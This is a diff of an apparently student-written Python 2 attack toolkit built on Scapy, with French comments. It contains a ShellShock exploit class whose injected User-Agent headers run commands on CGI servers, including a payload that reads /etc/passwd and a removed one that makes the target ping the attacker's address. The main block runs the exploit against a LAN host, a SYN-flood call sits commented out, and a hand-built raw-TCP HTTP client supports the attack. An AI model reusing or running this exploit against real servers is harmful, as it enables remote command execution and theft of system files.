@@ -58,25 +58,34 @@ class DOS():
 
 # class Attack():
 
-class ShellShock():#Attack):
-    HTTP_HEADER = {"User-Agent":"() { :; }; ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
+class ShellShock():#Attack):() { :;};echo; /bin/cat /etc/passwd
+    HTTP_HEADER = {"User-Agent":"() { :; }; echo; echo 'SHELL_SHOCK_WORK_HERE'"}#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
 
-    def __init__(self, host, script_page, ping_ip):
-        HTTP_HEADER['User-Agent'] += ping_ip
-        self.host = HTTP(host, header=HTTP_HEADER)
+    def __init__(self, host, script_page, ping_ip = "192.168.0.10"):
+        self.HTTP_HEADER['User-Agent'] += ping_ip
+        self.host = HTTP(host, header=self.HTTP_HEADER)
         self.target = script_page
 
     def run(self):
         self.host.GET(self.target)
-        pkts=sniff(filter="icmp", timeout=120,count=5)
-        for p in pkts:
-            if p[Raw].load[16:] == "SHELL_SHOCK_WORK":
-                print "Attaque réussie contre " + self.host
-                return True
 
+        # pkts=sniff(filter="icmp", timeout=120,count=5)
+        if "SHELL_SHOCK_WORK_HERE" in self.host.get[self.target]['data']:
 
+            # if p[Raw].load[16:] == "SHELL_SHOCK_WORK_HERE":
+            print "Faille exploitable sur " + self.host.host
+            print self.host.get[self.target]['data']
+            #     return True
 
 class HTTP():
+    """
+    Cette classe permet de manipuler les requêtes HTTP via SCAPY. La méthode GET est implémenté.
+    Les fonctions getForms et getRessources permettent de récupérer respectivement les formulaires
+    (paramètre et inputs) ainsi que les ressources incluent dans la page (html et php seulement).
+
+    Reste à implémenter: méthode POST
+    """
+
     RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
     FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
     INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
@@ -97,47 +106,68 @@ class HTTP():
         self.get = {}
 
     def handshake(self):
+        """
+            Permet d'établir le handshake TCP entre la machine et un hôte distant
+        """
+
         print "SYN/ACK ", self.host, self.sport
         syn = IP(dst = self.host) / TCP(dport=80, sport=self.sport, flags='S')
-        syn_ack = sr1(syn, verbose=0)
+        syn_ack = sr1(syn, verbose=0) # Sending syn, receiving syn ack
         ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
-        send(ack, verbose = 0)
+        send(ack, verbose = 0) # Sending ack
         return syn_ack
 
     def close(self, con, init = False):
+        """
+            Ferme la connexion passée en paramètre. Si init est à True, cela signifit que c'est la machine locale qui initie la fermeture de connexion.
+        """
+
+
         if con.haslayer(Raw):
             close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + len(con[Raw].load), flags='FA')
         else:
             close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + 1, flags='FA')
 
-        # If connection closing initiated by client: FIN ACK / ACK / FIN ACK / ACK else FIN ACK
+        # If connection closing initiated by client: send(FIN ACK) -> rcv(ACK then FIN ACK) -> send(ACK)
+        # If connection closing initiated by server:                          send(FIN ACK) ->  rcv(ACK)
         if init:
-            a, u = sr(close, verbose = 0, multi=1, timeout=0.5)
-            r = a[-1][1]
-            send(IP(dst=r[IP].src) / TCP(dport=80, sport=r[TCP].dport, seq=r[TCP].ack, ack=r[TCP].seq + 1, flags='A'), verbose=0)
-        else: send(close, verbose=0)
+            a, u = sr(close, verbose = 0, multi=1, timeout=0.5) # send(FIN ACK) -> rcv(ACK then FIN ACK)
+            r = a[-1][1]                                        # Selectinf FIN ACK in received packets
+            send(IP(dst=r[IP].src) / TCP(dport=80, sport=r[TCP].dport, seq=r[TCP].ack, ack=r[TCP].seq + 1, flags='A'), verbose=0) # Sending final ACK
+        else: send(close, verbose=0) # Sending FIN ACK
 
     def addFragment(self, html_rep, page, ack, seq):
+        """
+            Ajoute un fragment TCP recu à la liste des fragments TCP
+            Parse le header de la réponse HTTP s'il s'agit du premier fragment
+        """
 
         if page in self.get and not html_rep.startswith('HTTP'):
             if not (ack, seq) in self.get[page]['data_frag']:
-                self.get[page]['data_frag'][(ack, seq)] = html_rep
-                self.get[page]['len'] += len(html_rep)
-        elif html_rep.startswith('HTTP'):
+                self.get[page]['data_frag'][(ack, seq)] = html_rep      # Adding a fragment
+                self.get[page]['len'] += len(html_rep)                  # Updating total data length
+
+        elif html_rep.startswith('HTTP'):   # Received fragment is the first one (HTTP header)
             try: header, data = html_rep.split('\r\n\r\n', 1)
-            except:
+            except: # if no data in fragment header, split raise an error
                 header = html_rep
                 data = ''
-            header = header.split('\r\n')
+            header = header.split('\r\n')   # Splitting header lines
             code = int(header[0].split(' ')[1])
+
+            # Modifying header special fields that have no value so no ": " (to avoid errors later)
             for i in range(len(header)):
                  if ': ' not in header[i]: header[i] += ': '
+
             header = {i.split(': ')[0]:i.split(': ')[1] for i in header[1:]}
             self.get[page] = {'code':code, 'header':header, 'data_frag':{(ack, seq):data}, 'data':data, 'len': len(data)}
         else:
             print "ERREUR A TRAITER: HEADER N EST PAS ARRIVE EN PREMIER..."
 
     def mergeFragments(self, page):
+        """
+            Cette fonction fusionne les fragments TCP collectés dans le bon ordre
+        """
         if page in self.get:
             self.get[page]['data'] = ''.join([self.get[page]['data_frag'][i] for i in sorted(self.get[page]['data_frag'].keys())])
 
@@ -157,17 +187,22 @@ class HTTP():
 
         # GET
         con = self.__http_get(page, syn_ack)
-        del(self.get[page]['data_frag'])
 
-        if con.sprintf('%TCP.flags%') == 'R': return None
-        # FIN / ACK
-        if self.get[page]['code'] == 301:
+        if con.sprintf('%TCP.flags%') == 'R': return None # If connection reseted => exit function
+
+        # Close connection
+        del(self.get[page]['data_frag']) # Useless after this point, so deleting
+        if self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
             return self.GET(self.get[page]['header']['Location'], con)
         self.close(con, True)
 
         return self.get[page]
 
     def getForms(self, page):
+        """
+        Recherche les formulaires inclus dans une page
+        """
+
         forms = HTTP.FORM_REGEX.findall(self.get[page]['data'])
         self.get[page]['forms'] = []
         for params, content in forms:
@@ -186,6 +221,10 @@ class HTTP():
         return self.get[page]['forms']
 
     def getRessources(self, page):
+        """
+        Recherche les ressources web (html, PHP) inclues dans une page
+        """
+
         res = HTTP.RES_REGEX.findall(self.get[page]['data'])
         to_fetch = []
         for loc,ext,param in res:
@@ -202,17 +241,23 @@ class HTTP():
 
 
     def formatHeader(self):
+        """
+        Formatte de dictionnaire du header pour l'insérer dans la requête HTTP
+        """
         return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'
 
     def __http_get(self, page, syn_ack):
         q = Queue.Queue()
 
+        # Envoie de la requête GET
         getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
         request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr
         repl, u = sr(request, multi=1, timeout=1, verbose=0)
 
+        # On stocke tous les packets recus dans une file d'attente
         for s, reply in repl: q.put(reply)
 
+        # Proceeding queue and adding new replies to it
         while not q.empty():
             reply = q.get()
             if reply.sprintf('%TCP.flags%') in ['PA', 'A'] and (reply.haslayer(Raw)):
@@ -226,9 +271,7 @@ class HTTP():
                 for s, r in a: q.put(r)
                 # else: send(request, verbose=0)
 
-            elif reply.sprintf('%TCP.flags%') == 'R':
-                # if not 'data_frag' in self.get[page]: self.get[page]['data_frag'] = ''
-                break
+            elif reply.sprintf('%TCP.flags%') == 'R': break
 
         # for i in self.get[page]['data_frag']:
         #     print i, ' : ', self.get[page]['data_frag'][i][-50:]
@@ -260,26 +303,28 @@ if __name__ == "__main__":
 
     # html_rep = site.GET('groups/new.php')
     # html_rep = site.GET('index.nginx-debian.html')
-    html_rep = site.GET('')
-    for form in site.getForms(''):
-        print form
-
-
-    if html_rep == None:
-        print "Connection was reseted for an unkown reason."
-        sys.exit(0)
-
-    code = html_rep['code']
-
-    if code == 404:
-        print code, " - Not found"
-    elif code == 301:
-        print "Moved at : " + html_rep['header']['Location']
-        close(reply)
-    elif code == 200:
-        # print HTTP.RES_REGEX.findall(html_rep['data'])
-        # print html_rep['data']
-        print code
+    # html_rep = site.GET('')
+    # for form in site.getForms(''):
+    #     print form
+    #
+    #
+    # if html_rep == None:
+    #     print "Connection was reseted for an unkown reason."
+    #     sys.exit(0)
+    #
+    # code = html_rep['code']
+    #
+    # if code == 404:
+    #     print code, " - Not found"
+    # elif code == 301:
+    #     print "Moved at : " + html_rep['header']['Location']
+    #     close(reply)
+    # elif code == 200:
+    #     print html_rep['data']
+    #     print code
 
     # f = DOS("192.168.0.17", 80)
     # f.tcp_syn_flood()
+
+    shellshock = ShellShock("192.168.0.21", "cgi-bin/test.sh")
+    shellshock.run()
